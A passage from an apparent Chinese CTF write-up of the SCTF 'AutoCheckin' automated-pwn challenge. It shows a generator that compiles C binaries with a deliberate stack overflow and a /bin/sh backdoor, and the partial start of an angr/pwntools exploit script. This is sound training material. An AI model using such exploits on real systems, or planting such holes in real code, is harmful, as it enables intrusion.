class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">L = string.ascii_letters</span><br><span class="line">R = random.randint</span><br><span class="line">C = random.choice</span><br><span class="line">exploit_size = R(<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line">gifted = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rnd_str</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([L[R(<span class="number">0</span>, <span class="built_in">len</span>(L) - <span class="number">1</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_chall_enc</span>(<span class="params">v, n, l = <span class="number">0</span></span>):</span><br><span class="line">    op_list = [<span class="string">&quot;^&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;^&quot;</span>]</span><br><span class="line">    encs = [<span class="string">&quot;%s[%d] %s= 0x%x;&quot;</span> % (v, i, op_list[R(<span class="number">0</span>, <span class="built_in">len</span>(op_list) - <span class="number">1</span>)], R(<span class="number">0</span>, <span class="number">255</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    random.shuffle(encs)</span><br><span class="line">    <span class="keyword">if</span> l != <span class="number">0</span>:  encs = random.sample(encs, l)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\n&quot;</span>.join(encs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_exploit</span>():</span><br><span class="line">    code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    printf(&quot;<span class="subst">&#123;rnd_str(<span class="number">10</span>) + <span class="string">&quot;:&quot;</span>&#125;</span>&quot;);</span></span><br><span class="line"><span class="string">    input_line(exp_buffer, <span class="subst">&#123;exploit_size + <span class="number">40</span>&#125;</span>);</span></span><br><span class="line"><span class="string">    <span class="subst">&#123;gen_chall_enc(<span class="string">&quot;exp_buffer&quot;</span>, exploit_size, <span class="number">5</span>)&#125;</span></span></span><br><span class="line"><span class="string">    if (fksth(exp_buffer, &quot;<span class="subst">&#123;rnd_str(exploit_size - <span class="number">1</span>)&#125;</span>&quot;) == 0) return 0;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_chall_1</span>(<span class="params">l, r</span>):</span><br><span class="line">    challenge_name = rnd_str(R(<span class="number">10</span>, <span class="number">20</span>))</span><br><span class="line">    challenge_code = rnd_str(R(<span class="number">30</span>, <span class="number">60</span>))</span><br><span class="line">    challenge_len = <span class="built_in">len</span>(challenge_code)</span><br><span class="line">    code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    char chall[<span class="subst">&#123;challenge_len&#125;</span>];</span></span><br><span class="line"><span class="string">    printf(&quot;<span class="subst">&#123;challenge_name + <span class="string">&quot;:&quot;</span>&#125;</span>&quot;);</span></span><br><span class="line"><span class="string">    input_line(chall, <span class="subst">&#123;challenge_len&#125;</span>);</span></span><br><span class="line"><span class="string">    <span class="subst">&#123;gen_chall_enc(<span class="string">&quot;chall&quot;</span>, challenge_len)&#125;</span></span></span><br><span class="line"><span class="string">    if(fksth(chall, &quot;<span class="subst">&#123;challenge_code&#125;</span>&quot;) == 0) &#123;&#123;</span></span><br><span class="line"><span class="string">        <span class="subst">&#123;l&#125;</span></span></span><br><span class="line"><span class="string">    &#125;&#125; else &#123;&#123;</span></span><br><span class="line"><span class="string">        <span class="subst">&#123;r&#125;</span></span></span><br><span class="line"><span class="string">    &#125;&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_chall_2</span>(<span class="params">l, r</span>):</span><br><span class="line">    op_list = [<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;^&quot;</span>]</span><br><span class="line">    num_num = R(<span class="number">4</span>, <span class="number">8</span>)</span><br><span class="line">    challs = []</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(challs) &lt; <span class="number">3</span>:</span><br><span class="line">        challs = []</span><br><span class="line">        <span class="keyword">for</span> pair <span class="keyword">in</span> itertools.combinations(<span class="built_in">range</span>(num_num), <span class="number">2</span>):</span><br><span class="line">            challs.append(<span class="string">f&quot;(d[<span class="subst">&#123;pair[<span class="number">0</span>]&#125;</span>] <span class="subst">&#123;C(op_list)&#125;</span> d[<span class="subst">&#123;pair[<span class="number">1</span>]&#125;</span>]) == <span class="subst">&#123;<span class="built_in">hex</span>(R(<span class="number">0</span>, <span class="number">0xFFFF</span>))&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> pair <span class="keyword">in</span> itertools.combinations(<span class="built_in">range</span>(num_num), <span class="number">3</span>):</span><br><span class="line">            challs.append(<span class="string">f&quot;(d[<span class="subst">&#123;pair[<span class="number">0</span>]&#125;</span>] <span class="subst">&#123;C(op_list)&#125;</span> d[<span class="subst">&#123;pair[<span class="number">1</span>]&#125;</span>] <span class="subst">&#123;C(op_list)&#125;</span> d[<span class="subst">&#123;pair[<span class="number">2</span>]&#125;</span>]) == <span class="subst">&#123;<span class="built_in">hex</span>(R(<span class="number">0</span>, <span class="number">0xFFFF</span>))&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    challs = random.sample(challs, <span class="number">1</span>)</span><br><span class="line">    lll = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> challs: lll.append(<span class="string">f&quot;&quot;&quot;if(<span class="subst">&#123;i&#125;</span>) &#123;&#123; <span class="subst">&#123;l&#125;</span> &#125;&#125; else &#123;&#123; <span class="subst">&#123;r&#125;</span> &#125;&#125; ;&quot;&quot;&quot;</span> )</span><br><span class="line">    code_1 = <span class="string">&quot;\n&quot;</span>.join(lll)</span><br><span class="line">    sss = <span class="string">&quot;\n&quot;</span>.join([<span class="string">&quot;d[%d] = input_val();&quot;</span> % i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_num)])</span><br><span class="line">    code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    int d[<span class="subst">&#123;num_num&#125;</span>];</span></span><br><span class="line"><span class="string">    printf(&quot;<span class="subst">&#123;rnd_str(<span class="number">10</span>) + <span class="string">&quot;:&quot;</span>&#125;</span>&quot;);</span></span><br><span class="line"><span class="string">    <span class="subst">&#123;sss&#125;</span></span></span><br><span class="line"><span class="string">    <span class="subst">&#123;code_1&#125;</span></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_pwn</span>(<span class="params">deep</span>):</span><br><span class="line">    <span class="keyword">global</span> gifted</span><br><span class="line">    chall_func = random.choice([gen_chall_1, gen_chall_2])</span><br><span class="line">    <span class="keyword">if</span> deep == <span class="number">0</span>:</span><br><span class="line">        r = <span class="string">&quot;return 0;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> gifted <span class="keyword">and</span> random.randint(<span class="number">1</span>, <span class="number">5</span>) == <span class="number">4</span>:</span><br><span class="line">            gifted = <span class="literal">True</span></span><br><span class="line">            l = gen_exploit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = <span class="string">&quot;return 0;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = gen_pwn(deep - <span class="number">1</span>)</span><br><span class="line">        l = gen_pwn(deep - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> chall_func(l, r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_challenge</span>():</span><br><span class="line">    <span class="keyword">global</span> gifted, exploit_size</span><br><span class="line">    gifted = <span class="literal">False</span></span><br><span class="line">    template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    #include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;string.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    #define EXPLOIT_SIZE 100</span></span><br><span class="line"><span class="string">    int input_val() &#123;</span></span><br><span class="line"><span class="string">        char buffer[20];</span></span><br><span class="line"><span class="string">        int i = 0;</span></span><br><span class="line"><span class="string">        char ch = getchar();</span></span><br><span class="line"><span class="string">        while(ch != &#x27; &#x27; &amp;&amp; i &lt; 19) &#123;</span></span><br><span class="line"><span class="string">            buffer[i++] = ch;</span></span><br><span class="line"><span class="string">            ch = getchar();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        buffer[i] = 0;</span></span><br><span class="line"><span class="string">        return atoi(buffer);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    int input_line(char * buffer, size_t max_size) &#123;</span></span><br><span class="line"><span class="string">        int i;</span></span><br><span class="line"><span class="string">        for(i = 0; i &lt; max_size; i++) &#123;</span></span><br><span class="line"><span class="string">            char ch = getchar();</span></span><br><span class="line"><span class="string">            buffer[i] = ch;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        buffer[i] = 0;</span></span><br><span class="line"><span class="string">        return i;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    int fksth(const char * s1, const char * s2) &#123;</span></span><br><span class="line"><span class="string">        int sum = 0;</span></span><br><span class="line"><span class="string">        for(int i = 0; s1[i] != 0 &amp;&amp; s2[i] != 0 ; i++) &#123;</span></span><br><span class="line"><span class="string">            sum += (s1[i] - s2[i]);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return sum;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    char data[4096] = &#123;0&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    void backdoor() &#123;</span></span><br><span class="line"><span class="string">        system(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    void nothing() &#123;</span></span><br><span class="line"><span class="string">        printf(&quot;nothing\\n&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    void init() &#123;</span></span><br><span class="line"><span class="string">        setvbuf(stdin,  0LL, 2, 0LL);</span></span><br><span class="line"><span class="string">        setvbuf(stdout, 0LL, 2, 0LL);</span></span><br><span class="line"><span class="string">        setvbuf(stderr, 0LL, 2, 0LL);</span></span><br><span class="line"><span class="string">        alarm(120);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    int main() &#123;</span></span><br><span class="line"><span class="string">        char exp_buffer[%d];</span></span><br><span class="line"><span class="string">        init();</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            %s</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> % (exploit_size, gen_pwn(<span class="number">6</span>)) <span class="comment"># 6</span></span><br><span class="line">    filename = rnd_str(<span class="number">6</span>)</span><br><span class="line">    source_file = os.path.join(tempfile.gettempdir(), filename + <span class="string">&quot;.cpp&quot;</span>)</span><br><span class="line">    out_file =<span class="string">&quot;/home/ctf/chall_&quot;</span> + filename</span><br><span class="line">    <span class="built_in">open</span>(source_file, <span class="string">&quot;w&quot;</span>).write(template)</span><br><span class="line">    os.system(<span class="string">&quot;g++ %s -O0 -no-pie -fno-stack-protector -o %s &quot;</span> % (source_file, out_file))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(out_file):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Compile Failed!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(out_file, <span class="string">&quot;rb&quot;</span>).read(), out_file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>():</span><br><span class="line">    s = <span class="string">&quot;&quot;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">20</span>))</span><br><span class="line">    prefix = s[:<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(xxxx + %s) == %s &quot;</span> % (s[<span class="number">4</span>:],hashlib.sha256(s.encode()).hexdigest()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;give me xxxx:&quot;</span>)</span><br><span class="line">    ans = <span class="built_in">input</span>().strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(ans) == <span class="number">4</span> <span class="keyword">and</span> ans == prefix</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to SCTF, gl!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;AutoCheckin Challenge!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Easy StackOverFlow!!!!!!!&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">data, file = gen_challenge()</span><br><span class="line"><span class="keyword">if</span> data != <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(base64.b64encode(data).decode(<span class="string">&quot;ASCII&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==end==&quot;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    os.system(<span class="string">&quot;/usr/sbin/chroot --userspec=1000:1000 /home/ctf ./&quot;</span> + os.path.basename(file))</span><br><span class="line">    os.unlink(file)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Bye bye!&quot;</span>)</span><br></pre></td></tr></table></figure><p>网上并没有找到比较详细的wp,这么一大坨python代码看着其实还是有点头大的,但还是能看出来这是在生成一个<u>会受随机因素影响</u>的c文件,然后编译</p><p>正常运行的话,最终也是会给出二进制可执行文件的base64数据,本地可以接收到,也就是本地能得到二进制文件,也就是autopwn这类题的常规套路了</p><p>实际上做题的时候是无法得到这个py文件的</p><p>不过复现嘛,本地我们可以选择稍微修改以下脚本,然后让其将源文件输出出来,于是得到了一个有四千多行的源码(直接看反编译也差不多)</p><p>生成的一大坨类似这样的代码,稍微理解一下最终的题目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">chall[<span class="number">33</span>] ^= <span class="number">0x7d</span>;</span><br><span class="line">chall[<span class="number">4</span>] ^= <span class="number">0xca</span>;</span><br><span class="line">chall[<span class="number">38</span>] ^= <span class="number">0xa8</span>;</span><br><span class="line">chall[<span class="number">44</span>] ^= <span class="number">0x84</span>;</span><br><span class="line">chall[<span class="number">15</span>] ^= <span class="number">0xcf</span>;</span><br><span class="line">chall[<span class="number">1</span>] ^= <span class="number">0xac</span>;</span><br><span class="line">chall[<span class="number">16</span>] ^= <span class="number">0x58</span>;</span><br><span class="line">chall[<span class="number">20</span>] ^= <span class="number">0xfd</span>;</span><br><span class="line">chall[<span class="number">12</span>] ^= <span class="number">0x2</span>;</span><br><span class="line">chall[<span class="number">47</span>] ^= <span class="number">0x3d</span>;</span><br><span class="line">chall[<span class="number">13</span>] ^= <span class="number">0xa8</span>;</span><br><span class="line">chall[<span class="number">50</span>] ^= <span class="number">0x88</span>;</span><br><span class="line">chall[<span class="number">39</span>] ^= <span class="number">0x99</span>;</span><br><span class="line">chall[<span class="number">23</span>] ^= <span class="number">0xd6</span>;</span><br><span class="line">chall[<span class="number">34</span>] ^= <span class="number">0x4e</span>;</span><br><span class="line">chall[<span class="number">54</span>] ^= <span class="number">0x82</span>;</span><br><span class="line">chall[<span class="number">48</span>] ^= <span class="number">0x17</span>;</span><br><span class="line">    <span class="keyword">if</span>(fksth(chall, <span class="string">&quot;UtqILiNEQkZPtTJqzysqGduSIKNTXDJRYHWEVqvioXtGdTMdSHxYMOA&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        </span><br><span class="line">    <span class="type">int</span> d[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pZicbrnwUg:&quot;</span>);</span><br><span class="line">    d[<span class="number">0</span>] = input_val();</span><br><span class="line">d[<span class="number">1</span>] = input_val();</span><br><span class="line">d[<span class="number">2</span>] = input_val();</span><br><span class="line">d[<span class="number">3</span>] = input_val();</span><br><span class="line">d[<span class="number">4</span>] = input_val();</span><br><span class="line">d[<span class="number">5</span>] = input_val();</span><br><span class="line">    <span class="keyword">if</span>((d[<span class="number">2</span>] + d[<span class="number">3</span>]) == <span class="number">0xda0c</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125; <span class="keyword">else</span> &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125; ;</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">    <span class="type">char</span> chall[<span class="number">37</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;EGNAdszGujynjUVS:&quot;</span>);</span><br><span class="line">    input_line(chall, <span class="number">37</span>);</span><br><span class="line">    chall[<span class="number">13</span>] ^= <span class="number">0x63</span>;</span><br><span class="line">chall[<span class="number">33</span>] ^= <span class="number">0xea</span>;</span><br><span class="line">chall[<span class="number">10</span>] ^= <span class="number">0x52</span>;</span><br><span class="line">chall[<span class="number">29</span>] ^= <span class="number">0x22</span>;</span><br><span class="line">chall[<span class="number">22</span>] ^= <span class="number">0x6d</span>;</span><br><span class="line">chall[<span class="number">17</span>] ^= <span class="number">0xb2</span>;</span><br><span class="line">chall[<span class="number">4</span>] ^= <span class="number">0x54</span>;</span><br><span class="line">chall[<span class="number">14</span>] ^= <span class="number">0x6</span>;</span><br><span class="line">chall[<span class="number">21</span>] ^= <span class="number">0xdd</span>;</span><br><span class="line">chall[<span class="number">31</span>] ^= <span class="number">0x8f</span>;</span><br><span class="line">chall[<span class="number">28</span>] ^= <span class="number">0xc8</span>;</span><br><span class="line">chall[<span class="number">25</span>] ^= <span class="number">0x5e</span>;</span><br></pre></td></tr></table></figure><p>最后能够找到有一个溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)fksth(&amp;v2394, <span class="string">&quot;ckNoMypfzSlqmjBYgPMLwKMbRBCiHuQyVacpXXAWKMZnKtJodDviIbMG&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;jTQSsBTwBM:&quot;</span>);</span><br><span class="line">  input_line(v3072, <span class="number">0x3A</span>uLL);</span><br><span class="line">  v3073 ^= <span class="number">0xAF</span>u;</span><br><span class="line">  v3075 ^= <span class="number">0x99</span>u;</span><br><span class="line">  v3076 ^= <span class="number">0xF5</span>u;</span><br><span class="line">  v3077 ^= <span class="number">0xD</span>u;</span><br><span class="line">  v3074 ^= <span class="number">0xE6</span>u;</span><br><span class="line">  fksth(v3072, <span class="string">&quot;MqEJKIdJeQbMxeUNT&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>char v3072[3]; // [rsp+1420h] [rbp-20h] BYREF</code></p><p>程序有设置alarm,那么关键就是如何短时间完成挑战了,也就是自动化pwn的套路,根据前面做的那些题的总结,自己有一个思路是按照纵横杯那题一样,通过检测最后是否会调用input时参数第一个参数为<code>rbp-20h</code>,但不大确定这个变量是不是固定在这个位置,应当是不固定的</p><p>看一下出题人给出的wp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pass_proof</span>(<span class="params">target, part</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;123.60.82.85&quot;</span>, <span class="number">1447</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">proof = r.recvline().decode(<span class="string">&quot;ASCII&quot;</span>)</span><br><span class="line">ppp = pass_proof(proof[proof.find(<span class="string">&quot;== &quot;</span>) + <span class="number">3</span>: -<span class="number">2</span>], proof[<span class="built_in">len</span>(<span class="string">&quot;sha256(xxxx + &quot;</span>): proof.find(<span class="string">&quot;) == &quot;</span>)])</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;give me xxxx:&quot;</span>, ppp.encode(<span class="string">&quot;ASCII&quot;</span>))</span><br><span class="line">r.recvline()</span><br><span class="line">bin_data = base64.b64decode(r.recvline().decode(<span class="string">&quot;ASCII&quot;</span>))</span><br><span class="line"><span class="comment">###########################################################################################################</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;a.out&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(bin_data)</span><br><span class="line">ret_rop = bin_data.find(<span class="string">b&#x27;\xc3&#x27;</span>, <span class="number">0x1000</span>) + <span class="number">0x400000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ret_rop:&quot;</span>, <span class="built_in">hex</span>(ret_rop))</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./a.out&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getBVV</span>(<span class="params">state, sizeInBytes, <span class="built_in">type</span> = <span class="string">&#x27;str&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">global</span> pathConditions</span><br><span class="line">    name = <span class="string">&#x27;s_&#x27;</span> + <span class="built_in">str</span>(state.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>])</span><br><span class="line">    bvs = claripy.BVS(name, sizeInBytes * <span class="number">8</span>)</span><br><span class="line">    state.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>] += <span class="number">1</span></span><br><span class="line">    state.<span class="built_in">globals</span>[name] = (bvs, <span class="built_in">type</span>)</span><br><span class="line">    <span class="keyword">return</span> bvs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">angr_load_str</span>(<span class="params">state, addr</span>):</span><br><span class="line">    s, i = <span class="string">&#x27;&#x27;</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ch = state.solver.<span class="built_in">eval</span>(state.memory.load(addr + i, <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">        s += <span class="built_in">chr</span>(ch)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReplacementCheckEquals</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, str1, str2</span>):</span><br><span class="line">        cmp1 = angr_load_str(self.state, str2).encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        cmp0 = self.state.memory.load(str1, <span class="built_in">len</span>(cmp1))</span><br><span class="line">        self.state.regs.rax = claripy.If(cmp1 == cmp0, claripy.BVV(<span class="number">0</span>, <span class="number">32</span>), claripy.BVV(<span class="number">1</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReplacementCheckInput</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, buf, <span class="built_in">len</span></span>):</span><br><span class="line">        <span class="built_in">len</span> = self.state.solver.<span class="built_in">eval</span>(<span class="built_in">len</span>)</span><br><span class="line">        self.state.memory.store(buf, getBVV(self.state, <span class="built_in">len</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title 